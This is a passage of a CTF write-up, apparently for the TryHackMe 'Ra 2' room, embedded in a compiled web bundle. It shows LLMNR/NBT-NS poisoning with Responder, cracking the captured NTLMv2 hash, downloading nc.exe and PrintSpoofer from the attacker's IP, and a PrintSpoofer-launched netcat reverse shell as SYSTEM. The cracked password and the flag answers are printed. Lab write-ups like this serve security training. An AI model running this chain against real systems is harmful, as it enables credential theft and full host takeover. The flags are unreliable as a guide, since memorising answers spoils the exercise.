gen-self-signed-cert.sh  key.pem  responder.crt  responder.key\n\nkali@kali:~/CTFs/tryhackme/Ra 2$ sudo nano /etc/responder/Responder.conf\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Ra 2$ sudo responder -I tun0\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.0.0.0\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit CTRL-C\n\n\n[+] Poisoners:\n    LLMNR                      [ON]\n    NBT-NS                     [ON]\n    DNS/MDNS                   [ON]\n\n[+] Servers:\n    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD proxy                 [OFF]\n    Auth proxy                 [OFF]\n    SMB server                 [ON]\n    Kerberos server            [ON]\n    SQL server                 [ON]\n    FTP server                 [ON]\n    IMAP server                [ON]\n    POP3 server                [ON]\n    SMTP server                [ON]\n    DNS server                 [ON]\n    LDAP server                [ON]\n    RDP server                 [ON]\n\n[+] HTTP Options:\n    Always serving EXE         [OFF]\n    Serving EXE                [OFF]\n    Serving HTML               [OFF]\n    Upstream Proxy             [OFF]\n\n[+] Poisoning Options:\n    Analyze Mode               [OFF]\n    Force WPAD auth            [OFF]\n    Force Basic Auth           [OFF]\n    Force LM downgrade         [OFF]\n    Fingerprint hosts          [OFF]\n\n[+] Generic Options:\n    Responder NIC              [tun0]\n    Responder IP               [10.8.106.222]\n    Challenge set              [random]\n    Don't Respond To Names     ['ISATAP']\n\n\n\n[+] Listening for events...\n[HTTP] NTLMv2 Client   : 10.10.34.115\n[HTTP] NTLMv2 Username : WINDCORP\\edwardle\n[HTTP] NTLMv2 Hash     : edwardle::WINDCORP:9ed1e3cb414d26d7:CF1983C3F404EAD38CC0CB91BBAFA09F:0101000000000000D61E7D30C8A4D601DB7E9DBC059F4E60000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C00080030003000000000000000010000000020000099A10F5EFB667547433C87F28386E0CEA33BC58B6355A26FBD43919D5CA98B790A00100012C690EF73A24A276DC3EDC54B8CC48409003A0048005400540050002F00730065006C00660073006500720076006900630065002E00770069006E00640063006F00720070002E00740068006D000000000000000000\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Ra 2$ john edwardle.hash --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n!Angelus25!      (edwardle)\n1g 0:00:00:25 DONE (2020-10-17 22:59) 0.03883g/s 556936p/s 556936c/s 556936C/s !SkicA!..!@#fuck\nUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably\nSession completed\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"edwardle:!Angelus25!")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://fire.windcorp.thm/powershell/en-US/logon.aspx?ReturnUrl=%2fpowershell"},"https://fire.windcorp.thm/powershell/en-US/logon.aspx?ReturnUrl=%2fpowershell")),(0,s.kt)("p",null,(0,s.kt)("img",{src:t(13566).Z,width:"510",height:"437"})),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-ps1"},'Windows PowerShell\n\nCopyright (C) 2016 Microsoft Corporation. All rights reserved.\n\n\n\nPS C:\\Users\\edwardle.WINDCORP\\Documents>\n\ncd ..\\Desktop\n\nPS C:\\Users\\edwardle.WINDCORP\\Desktop>\n\ndir\n\n\n\n\n\n    Directory: C:\\Users\\edwardle.WINDCORP\\Desktop\n\n\n\n\n\nMode                LastWriteTime         Length Name\n\n----                -------------         ------ ----\n\n-a----        5/31/2020  10:12 AM             47 Flag 2.txt\n\n\n\n\n\nPS C:\\Users\\edwardle.WINDCORP\\Desktop>\n\ntype "Flag 2.txt"\n\nTHM{8a1d460dfe345f8edd09d45ae00e5c1c14d12c89}\n\nPS C:\\Users\\edwardle.WINDCORP\\Desktop> whoami /priv\n\n\n\nPRIVILEGES INFORMATION\n\n----------------------\n\n\n\nPrivilege Name                Description                               State\n\n============================= ========================================= =======\n\nSeMachineAccountPrivilege     Add workstations to domain                Enabled\n\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled\n\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled\n\nSeIncreaseWorkingSetPrivilege Increase a process working set            Enabled\n\nPS C:\\Users\\edwardle.WINDCORP\\Desktop>\n')),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'$WebClient = New-Object System.Net.WebClient\n$WebClient.DownloadFile("http://10.8.106.222/nc.exe","C:\\Users\\edwardle.WINDCORP\\Desktop")\n')),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},'Invoke-WebRequest -Uri "http://10.8.106.222/nc.exe" -OutFile "C:\\Users\\edwardle.WINDCORP\\Documents\\nc.exe"')),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},'Invoke-WebRequest -Uri "http://10.8.106.222/PrintSpoofer.exe" -OutFile "C:\\Users\\edwardle.WINDCORP\\Documents\\PrintSpoofer.exe"')),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'PS C:\\Users\\edwardle.WINDCORP\\Documents>\n\nInvoke-WebRequest -Uri "http://10.8.106.222/nc.exe" -OutFile "C:\\Users\\edwardle.WINDCORP\\Documents\\nc.exe"\n\nPS C:\\Users\\edwardle.WINDCORP\\Documents>\n\nInvoke-WebRequest -Uri "http://10.8.106.222/PrintSpoofer.exe" -OutFile "C:\\Users\\edwardle.WINDCORP\\Documents\\PrintSpoof\n\ner.exe"\n\nPS C:\\Users\\edwardle.WINDCORP\\Documents>\n\ndir\n\n\n\n\n\n    Directory: C:\\Users\\edwardle.WINDCORP\\Documents\n\n\n\n\n\nMode                LastWriteTime         Length Name\n\n----                -------------         ------ ----\n\n-a----       10/17/2020   2:33 PM          59392 nc.exe\n\n-a----       10/17/2020   2:34 PM          27136 PrintSpoofer.exe\n\n-a----         6/1/2020   4:20 AM            253 surfsup.cmd\n\n\n\n\n\nPS C:\\Users\\edwardle.WINDCORP\\Documents>\n')),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'S C:\\Users\\edwardle.WINDCORP\\Documents>\n\n.\\PrintSpoofer.exe -c ".\\nc.exe 10.8.106.222 9001 -e cmd"\n\n[+] Found privilege: SeImpersonatePrivilege\n\n[+] Named pipe listening...\n\n[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().\n\n[+] CreateProcessWithTokenW() OK\n\nPS C:\\Users\\edwardle.WINDCORP\\Documents>\n')),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'C:\\Windows\\system32>cd C:\\\ncd C:\\\n\nC:\\>cd Users\ncd Users\n\nC:\\Users>cd Administrator\ncd Administrator\n\nC:\\Users\\Administrator>cd Desktop\ncd Desktop\n\nC:\\Users\\Administrator\\Desktop>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is 84E1-0562\n\n Directory of C:\\Users\\Administrator\\Desktop\n\n06/01/2020  10:36 AM    <DIR>          .\n06/01/2020  10:36 AM    <DIR>          ..\n05/31/2020  02:32 AM                47 Flag 3.txt\n               1 File(s)             47 bytes\n               2 Dir(s)  43,815,673,856 bytes free\n\nC:\\Users\\Administrator\\Desktop>type "Flag 3.txt"\ntype "Flag 3.txt"\nTHM{9a8b9f4f3af2bce68885106c1c8473ab85e0eda0}\n')),(0,s.kt)("ol",null,(0,s.kt)("li",{parentName:"ol"},"What is flag 1?")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"THM{Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources}")),(0,s.kt)("ol",{start:2},(0,s.kt)("li",{parentName:"ol"},"What is flag 2?")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"THM{8a1d460dfe345f8edd09d45ae00e5c1c14d12c89}")),(0,s.kt)("ol",{start:3},(0,s.kt)("li",{parentName:"ol"},"What is flag 3?")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"THM{9a8b9f4f3af2bce68885106c1c8473ab85e0eda0}")))}h.isMDXComponent=!0},94981:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/2020-10-17_22-19-28ce81c7bba2e5a82982fefd00b26c68.png"},13566:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/2020-10-17_23-01-ab2afda7fbcc8406dcd1724e601e3b2b.png"}}]);